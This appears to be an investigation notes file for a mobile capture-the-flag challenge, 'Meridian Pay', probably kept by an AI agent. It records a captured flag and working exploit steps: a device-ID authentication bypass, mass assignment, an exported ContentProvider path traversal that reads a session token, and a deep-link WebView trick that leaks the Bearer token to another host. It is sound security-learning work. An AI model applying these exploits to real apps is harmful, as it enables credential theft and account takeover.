# Meridian Pay CTF — Current Investigation Memory

## Scope

- Challenge: **Meridian Pay** (Mobile, hard, four flags)
- Official challenge metadata confirms `total_flags: 4`.
- Instance: `https://web-f747413d78eddd9f.web.h7tex.com`
- APK: `meridian-pay-3.2.1.apk/meridian-pay-3.2.1.apk`
- Package: `com.meridian.pay`

Challenge text:

> Meridian Pay is a neobank that shipped in a hurry and trusts everyone: the client trusts the server, the server trusts the client, and both trust the phone underneath. Four separate cracks are hiding in that arrangement, some in the app and some in the API behind it, one flag each.

## Confirmed live flag

The currently deployed instance returned:

```text
H7CTF{e180cf14-4bb8-47df-8760-b62c6a1080ea}
```

The instance regenerates/reset its flag value. Older session notes contain prior values that should not be submitted to the current instance.

### Reproduce Flag 1

The server accepts any client-controlled `device_id`, then issues a valid JWT for user `1001`.

```powershell
# Node.js HTTPS works from this Windows environment; curl/PowerShell TLS did not.
```

Request sequence:

```http
POST /api/v1/auth/device
X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
Content-Type: application/json

{"device_id":"anything"}
```

Then:

```http
GET /api/v1/internal/promo
Authorization: Bearer <issued JWT>
X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
```

Response includes the flag in a `<pre>` element.

Observed JWT payload shape:

```json
{"sub":"1001","iat":...,"exp":...}
```

## Confirmed vulnerabilities

### 1. Client-controlled device authentication

- `POST /api/v1/auth/device` accepts arbitrary, malformed, numeric, array, or object-like values as `device_id` when truthy.
- Every tested value still returns `user_id: 1001` and JWT `sub: "1001"`.
- This is the confirmed source of the currently recovered flag.

### 2. Mass assignment in `PATCH /api/v1/profile`

- Endpoint permits only `PATCH` and `OPTIONS`.
- Arbitrary JSON fields are accepted and shown in `updated`.
- Response only displays `email`, `name`, `role`, and `tier`.

Example:

```http
PATCH /api/v1/profile
Authorization: Bearer <JWT>
X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
Content-Type: application/json

{"is_admin":true,"role":"admin","tier":"premium"}
```

Important result: many privilege and identity fields were tested (`id`, `user_id`, `sub`, `account_id`, `member_id`, `is_admin`, `is_staff`, `permissions`, `scopes`, `role`, `tier`, etc.). They are accepted but do **not** alter a newly minted token's subject; it remains `1001`. `/api/v1/internal/promo` always returned the already-solved flag.

### 3. Exported `ContentProvider` path traversal

- Authority: `content://com.meridian.pay.export`
- Provider is exported.
- `ExportProvider.openFile()` joins an untrusted URI path to `<filesDir>/receipts` without canonical-path containment checking.

Confirmed intended read:

```text
content://com.meridian.pay.export/files/receipt-8827.txt
```

Confirmed traversal:

```text
content://com.meridian.pay.export/files/../../shared_prefs/session.xml
```

This reads session storage, including `base_url`, `session_token`, `device_id`, and `account_name`.

Example command on the available local emulator:

```powershell
$adb='C:\Users\USER\AppData\Local\Android\Sdk\platform-tools\adb.exe'
& $adb shell content read --uri 'content://com.meridian.pay.export/files/../../shared_prefs/session.xml'
```

Observed session XML after app authentication:

```xml
<map>
  <string name="base_url">https://web-f747413d78eddd9f.web.h7tex.com</string>
  <string name="session_token">&lt;JWT&gt;</string>
  <string name="device_id">and-&lt;UUID&gt;</string>
  <string name="account_name">Alicia Reyes</string>
</map>
```

This leaked token also retrieves only Flag 1 so far.

### 4. Exported deep-link / WebView credential leak

- `RouterActivity` is exported and accepts `meridianpay://open?...`.
- It forwards the `url` query parameter to non-exported `WebViewActivity`.
- `WebViewActivity` checks `url.startsWith(baseUrl)` then attaches:
  - `Authorization: Bearer <session token>`
  - `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`
- `startsWith()` is not an origin check.

Verified proof of header leakage:

1. Set app base URL to `http://10.0.2.2:8080` while retaining an authenticated token.
2. Run an HTTP listener on host port `8081`.
3. Launch this intent:

```powershell
& $adb shell am start -a android.intent.action.VIEW -d 'meridianpay://open?url=http%3A%2F%2F10.0.2.2%3A8080%4010.0.2.2%3A8081%2Fheaders'
```

The URL passes `startsWith("http://10.0.2.2:8080")` but resolves to host `10.0.2.2:8081` via URL userinfo syntax. The listener received both credentials.

The leaked JWT again retrieves only Flag 1 at present.

## Verified API surface

Known routes:

| Route | Methods / behavior |
| --- | --- |
| `/` | `GET` returns service/version JSON |
| `/api/v1/auth/device` | `POST` only; arbitrary truthy `device_id` accepted |
| `/api/v1/profile` | `PATCH` only; mass assignment |
| `/api/v1/promo/public` | `GET`; public HTML linking to internal promo |
| `/api/v1/internal/promo` | `GET`; JWT + exact client header required; Flag 1 |

Required exact client header:

```text
X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)
```

An expanded standard API wordlist scan of root and `/api/v1/` found only the existing profile and internal-promo endpoints. Query-parameter and proxy-header variations against `internal/promo` caused no changed response.

## Android runtime available locally

Installed SDK paths:

```text
C:\Users\USER\AppData\Local\Android\Sdk\emulator\emulator.exe
C:\Users\USER\AppData\Local\Android\Sdk\platform-tools\adb.exe
```

AVD:

```text
Medium_Phone_API_36.1
```

Boot headlessly:

```powershell
Start-Process -FilePath 'C:\Users\USER\AppData\Local\Android\Sdk\emulator\emulator.exe' `
  -ArgumentList '-avd','Medium_Phone_API_36.1','-no-window','-no-audio','-gpu','swiftshader_indirect' `
  -WindowStyle Hidden
```

Install and launch APK:

```powershell
$adb='C:\Users\USER\AppData\Local\Android\Sdk\platform-tools\adb.exe'
& $adb install -r 'C:\Users\USER\OneDrive\Desktop\codex  ctf\meridian-pay-3.2.1.apk\meridian-pay-3.2.1.apk'
& $adb shell monkey -p com.meridian.pay -c android.intent.category.LAUNCHER 1
```

Stop emulator when done:

```powershell
& $adb emu kill
```

## Key static APK facts

- Package components: `MainActivity`, `RouterActivity`, `WebViewActivity`, `ExportProvider`.
- `RouterActivity` and `ExportProvider` are exported.
- App uses cleartext traffic and allows backups.
- No static `H7CTF{...}` string exists in the APK.
- No nonstandard API paths are referenced in the app DEX.

## Important negative results

- Profile manipulation does not change JWT subject or select a new promo response.
- Changing role/tier/permissions/identity fields does not expose another route or flag.
- Device ID injection strings and type confusion do not change identity; all valid truthy inputs map to `1001`.
- Leaked session tokens and WebView-leaked tokens retrieve the same promo flag.
- Route enumeration found no extra API endpoint.
- `internal/promo` query parameters and common forwarding/debug headers have no effect.

## Current theory / next work

The official challenge truly has four flags, but three concrete vulnerabilities currently converge on the same server-side flag endpoint. Continue by finding the intended trigger that distinguishes the individual checkpoint flags—likely a backend state machine or a route/value not visible in the APK. Do not assume the vulnerabilities are separate flags merely because the challenge description says four flaws.

Potential areas still worth testing:

1. Endpoint path normalization/alternate routing at the reverse proxy (encoded slashes, semicolons, duplicate slashes, absolute-form requests).
2. Request-body parsing discrepancies for `/auth/device` and `/profile` (duplicate JSON keys, content-type variations, form/multipart bodies).
3. Android intent edge cases around `RouterActivity` and URL parsing beyond the verified header leak.
4. Official CTF platform authenticated API, if user credentials become available; it may expose per-flag submission/checkpoint feedback but must not be assumed public.

## Existing historical notes

Older, longer investigation logs remain in:

- `meridian_pay_ctf_session_log.md`
- `meridian_pay_challenge_chat_memory.txt`

This file supersedes their conclusion that Android runtime was unavailable: the local emulator was successfully booted and both Android exploit paths were executed.
